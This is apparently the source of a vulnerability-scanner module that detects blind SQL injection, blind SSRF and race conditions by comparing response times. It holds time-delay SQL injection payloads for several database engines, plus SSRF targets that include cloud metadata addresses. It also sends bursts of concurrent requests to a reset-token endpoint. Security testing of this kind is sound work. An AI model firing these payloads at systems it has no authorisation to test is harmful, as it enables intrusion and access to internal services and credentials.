"""Differential timing analysis for blind injection detection.

Detects blind SQLi, blind SSRF, and race conditions by comparing response
times of delay payloads vs control payloads against baselines.
"""

from __future__ import annotations

import asyncio
import logging
import time
from dataclasses import dataclass
from statistics import mean, stdev
from urllib.parse import urljoin

import httpx

logger = logging.getLogger(__name__)

# Delay payloads for different database engines
SQLI_DELAY_PAYLOADS = {
    "mysql": [
        ("' OR SLEEP(3)--", "MySQL SLEEP(3)"),
        ("' OR BENCHMARK(10000000,SHA1('test'))--", "MySQL BENCHMARK"),
        ("1 OR SLEEP(3)", "MySQL SLEEP numeric"),
    ],
    "postgresql": [
        ("'; SELECT pg_sleep(3)--", "PostgreSQL pg_sleep(3)"),
        ("1; SELECT pg_sleep(3)--", "PostgreSQL pg_sleep numeric"),
    ],
    "mssql": [
        ("'; WAITFOR DELAY '0:0:3'--", "MSSQL WAITFOR 3s"),
        ("1; WAITFOR DELAY '0:0:3'--", "MSSQL WAITFOR numeric"),
    ],
    "sqlite": [
        ("' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--", "SQLite heavy computation"),
    ],
    "oracle": [
        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "Oracle DBMS_PIPE 3s"),
    ],
}

# Control payloads — same length/structure as delay payloads but no delay
SQLI_CONTROL_PAYLOADS = {
    "mysql": [
        ("' OR 1=1--", "MySQL control baseline"),
        ("1 OR 1=1", "MySQL control numeric"),
    ],
    "postgresql": [
        ("' OR 1=1--", "PostgreSQL control"),
    ],
    "mssql": [
        ("' OR 1=1--", "MSSQL control"),
    ],
    "sqlite": [
        ("' AND 1=1--", "SQLite control"),
    ],
    "oracle": [
        ("' AND 1=1--", "Oracle control"),
    ],
}

# Internal URLs for blind SSRF testing
SSRF_INTERNAL_URLS = [
    "http://127.0.0.1", "http://localhost", "http://169.254.169.254",
    "http://metadata.google.internal", "http://100.100.100.200",
]


@dataclass
class TimingResult:
    url: str
    test_type: str
    finding: str | None = None
    severity: str = "info"
    evidence: str = ""
    baseline_ms: float = 0.0
    delay_ms: float = 0.0
    control_ms: float = 0.0
    is_blind_vuln: bool = False


class TimingAnalyzer:
    """Differential timing analysis for blind injection detection."""

    MIN_DELAY_THRESHOLD = 3.0   # seconds — delay payload must exceed this
    TIMING_DIFF_THRESHOLD = 50  # ms — minimum differential to consider significant

    def __init__(self, max_concurrent: int = 3, timeout: float = 15.0, rate_rps: float = 5.0) -> None:
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.timeout = timeout
        self._delay = 1.0 / rate_rps if rate_rps > 0 else 0

    async def _request(self, client: httpx.AsyncClient, method: str, url: str, **kwargs) -> tuple[httpx.Response | None, float]:
        """Make a request and return (response, elapsed_seconds)."""
        async with self.semaphore:
            if self._delay:
                await asyncio.sleep(self._delay)
            start = time.monotonic()
            try:
                resp = await client.request(method, url, timeout=self.timeout, follow_redirects=False, **kwargs)
                elapsed = time.monotonic() - start
                return resp, elapsed
            except (httpx.HTTPError, Exception):
                elapsed = time.monotonic() - start
                return None, elapsed

    async def _collect_baseline(self, client: httpx.AsyncClient, url: str, samples: int = 3) -> list[float]:
        """Collect baseline response times (seconds)."""
        times: list[float] = []
        for _ in range(samples):
            _, elapsed = await self._request(client, "GET", url)
            times.append(elapsed)
            await asyncio.sleep(0.5)
        return times

    async def test_blind_sqli(
        self, base_url: str, param: str = "id",
        paths: list[str] | None = None,
    ) -> list[TimingResult]:
        """Test for blind SQL injection using time-delay payloads.

        For each endpoint:
        1. Collect 3 baseline timing samples
        2. Send delay payload and measure time
        3. Send control payload (same length, no delay) and measure time
        4. If delay payload > baseline + 3s AND delay > control + 3s, flag as blind SQLi
        """
        paths = paths or ["/", "/search", "/api/v1/users", "/login"]
        results: list[TimingResult] = []

        async with httpx.AsyncClient(verify=False) as client:
            for path in paths:
                url = urljoin(base_url, path.lstrip("/"))

                # Collect baseline
                baselines = await self._collect_baseline(client, url)
                baseline_ms = mean(baselines) * 1000

                # Test each database engine
                for engine, payloads in SQLI_DELAY_PAYLOADS.items():
                    controls = SQLI_CONTROL_PAYLOADS.get(engine, [])

                    for payload_str, payload_desc in payloads:
                        # Send delay payload
                        test_url = f"{url}?{param}={payload_str}" if "?" not in url else f"{url}&{param}={payload_str}"
                        _, delay_time = await self._request(client, "GET", test_url)
                        delay_ms = delay_time * 1000

                        # Send control payload
                        control_ms = baseline_ms
                        for ctrl_str, ctrl_desc in controls:
                            ctrl_url = f"{url}?{param}={ctrl_str}" if "?" not in url else f"{url}&{param}={ctrl_str}"
                            _, ctrl_time = await self._request(client, "GET", ctrl_url)
                            control_ms = ctrl_time * 1000
                            break  # Use first control

                        # Statistical analysis
                        delay_diff = delay_ms - baseline_ms
                        control_diff = control_ms - baseline_ms

                        is_blind = (
                            delay_time > self.MIN_DELAY_THRESHOLD
                            and delay_ms > baseline_ms + 3000  # 3s over baseline
                            and delay_ms > control_ms + 3000    # 3s over control
                        )

                        if is_blind:
                            results.append(TimingResult(
                                url=url, test_type=f"blind_sqli_{engine}",
                                finding=f"Blind SQLi ({engine}): {payload_desc}",
                                severity="high",
                                evidence=f"Baseline: {baseline_ms:.0f}ms, Delay: {delay_ms:.0f}ms, Control: {control_ms:.0f}ms",
                                baseline_ms=baseline_ms, delay_ms=delay_ms,
                                control_ms=control_ms, is_blind_vuln=True,
                            ))

        return results

    async def test_blind_ssrf(self, base_url: str, params: list[str] | None = None) -> list[TimingResult]:
        """Test for blind SSRF by injecting internal URLs and checking timing/response differences."""
        params = params or ["url", "redirect", "next", "callback", "dest"]
        results: list[TimingResult] = []

        async with httpx.AsyncClient(verify=False) as client:
            # Get baseline timing for normal requests
            baselines = await self._collect_baseline(client, base_url)
            baseline_ms = mean(baselines) * 1000

            for param in params:
                for internal_url in SSRF_INTERNAL_URLS:
                    test_url = f"{base_url}?{param}={internal_url}"
                    _, elapsed = await self._request(client, "GET", test_url)
                    elapsed_ms = elapsed * 1000

                    diff = abs(elapsed_ms - baseline_ms)
                    # Significant timing differential could indicate SSRF processing
                    if diff > 1000:  # 1s+ differential
                        results.append(TimingResult(
                            url=test_url, test_type="blind_ssrf",
                            finding=f"Possible blind SSRF via {param}: timing differential {diff:.0f}ms",
                            severity="medium",
                            evidence=f"Baseline: {baseline_ms:.0f}ms, Test: {elapsed_ms:.0f}ms, Diff: {diff:.0f}ms",
                            baseline_ms=baseline_ms, delay_ms=elapsed_ms,
                            control_ms=baseline_ms, is_blind_vuln=diff > 3000,
                        ))

        return results

    async def test_timing_race(self, base_url: str, endpoint: str = "/api/reset-token") -> list[TimingResult]:
        """Test for race conditions by sending concurrent requests."""
        results: list[TimingResult] = []
        url = urljoin(base_url, endpoint.lstrip("/"))

        async with httpx.AsyncClient(verify=False) as client:
            baselines = await self._collect_baseline(client, url)
            baseline_ms = mean(baselines) * 1000

            # Send 10 concurrent requests
            tasks = [self._request(client, "POST", url) for _ in range(10)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)

            status_codes = []
            for r in responses:
                if isinstance(r, tuple) and r[0] is not None:
                    status_codes.append(r[0].status_code)

            # If we get mixed status codes, there might be a race condition
            if len(set(status_codes)) > 1:
                results.append(TimingResult(
                    url=url, test_type="race_condition",
                    finding=f"Race condition detected: mixed status codes {set(status_codes)}",
                    severity="medium",
                    evidence=f"Concurrent requests returned: {status_codes}",
                    baseline_ms=baseline_ms,
                ))

        return results